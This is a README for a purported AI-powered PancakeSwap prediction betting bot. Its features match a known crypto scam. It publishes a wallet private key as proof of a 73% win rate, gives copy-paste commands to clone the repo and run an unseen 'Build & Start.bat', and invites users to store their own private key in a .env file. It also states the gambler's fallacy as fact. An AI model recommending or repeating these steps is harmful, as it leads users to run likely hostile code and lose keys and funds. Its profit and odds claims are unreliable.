<p align="center">
<img src=https://img.shields.io/github/stars/PredictBots/PancakeswapPredictUltimateWinner?style=for-the-badge&logo=appveyor&color=blue />
<img src=https://img.shields.io/github/forks/PredictBots/PancakeswapPredictUltimateWinner?style=for-the-badge&logo=appveyor&color=blue />
<img src=https://img.shields.io/github/issues/PredictBots/PancakeswapPredictUltimateWinner?style=for-the-badge&logo=appveyor&color=informational />
<img src=https://img.shields.io/github/issues-pr/PredictBots/PancakeswapPredictUltimateWinner?style=for-the-badge&logo=appveyor&color=informational />
</p>
  
# 🔮 PancakeSwap Prediction Bot (SMART AI powered) v18.1 🚀 

PancakeSwap Prediction Bot using AI recommendations.

After accessing the wallet with the key below, connect to the Pancakeswap BNB Prediction game. See for yourself how I earned +6 bnb with a 73% success rate. This is just an experiment we do with an example wallet. You 
can do more!

Private key: `5192b3ff45eb69e460bd924fb7379be089515d19f7a418499b2c303249db3bd9`
(Do not put money into the wallet whose key is written above. This may result in the loss of your funds. Use this wallet only to review earnings statistics.)

## ⭐Please consider giving a **star**.

###  Evidences dated 17 JANUARY 2024
![Winning rate](/images/1.png?raw=true)
![Winning rate](/images/2.png?raw=true)

## 🐰⚡ Installation Way I

Download and Install Git here:
[Git](https://git-scm.com/download/win)

Then run the following commands in terminal or CMD:

```shell
git clone https://github.com/PredictBots/PancakeswapPredictUltimateWinner
cd PancakeswapPredictUltimateWinner
"Build & Start.bat"
```

## 🐰⚡ Installation Way II

- Download [This Repo](https://github.com/PredictBots/PancakeswapPredictUltimateWinner/archive/refs/heads/main.zip) the repository release and extract files. 
- Double-click on the "Build & Start.bat" file to run it.
- And follow the instructions in the application window.


## ⚙️ Setup Way I {No private key required} (**Recommended**)

1. Open the **bot.py** file and setup the following variables:
```
BET_AMOUNT: 20, // Amount of each bet (In USD)
```

Download and Install Git here:
[Git](https://git-scm.com/download/win)

Then run the following commands in terminal or CMD:

```shell
git clone https://github.com/PredictBots/PancakeswapPredictUltimateWinner
cd PancakeswapPredictUltimateWinner
"Build & Start.bat"
```

Or

## ⚙️ Setup Way II

1. Open the **.env** file with any code/text editor and add your private key like so:
```
PRIVATE_KEY="5192b3ff45eb69e460bd924fb7379be089515d19f7a418499b2c303249db3bd9"
(If you are using automatic on browser mode, leave this blank!)
```
3. Open the **bot.py** file and setup the following variables:
```
BET_AMOUNT: 30, // Amount of each bet (In USD)
```

## 🤖📈 Strategy
- The bot take a series of recommendations given by Trading View and process them together with the tendency of the rest of people betting. After the algorithm have complete, it choose to bet Up or Down.
- Additionally, you can also choose the fully AI-powered strategy. 
- After all my testings in apron 66 rounds I was able to achieve a **~73% Win rate**. Of course it depends of a lot of variables, so I can't ensure that you will reproduce the same behavior.
The key of the wallet we tested: "5192b3ff45eb69e460bd924fb7379be089515d19f7a418499b2c303249db3bd9". You can check the earning percentage yourself on the pancakeswap prediction site.

- Before every round the bot will check if you have enough balance in your wallet and if you have reached the daily goal.
- Also it will save the daily history in the **/history** directory.
- Be aware that after consecutive losses, statistically you have more chances to win in the next one.
- Inside **bot.py** in the ``THRESHOLD`` property of ``GLOBAL_CONFIG`` variable, you can configure the minimum certainty with which the bot will bet. For default it's set to 50, which means that from 50% certainty the 
bot will bet. You can raise it (50-100) to bet only when the bot is more sure about its prediction.
- Its recommendable to have x10 - x50 the amount of bet to have an average of rounds.


💰You can check the history of rounds and claim rewards here: https://pancakeswap.finance/prediction

## ✔️ To Do 

 - [x] USD Based bet 
 - [x] Show real time profit 
 - [x] Show real time win rate 
 - [x] Improved algorithm v5.0 🔥
 - [x] AI Driven bot 🔥
 - [x] Stop Loss
 - [x] Simplify settings 
 - [x] Auto collect winnings 


## 👁️ Disclaimers

**Please be aware of clones**

# Support Chat

Join the telegram [support chat](https://t.me/pancakeswapprediction) You can access all our announcements here.
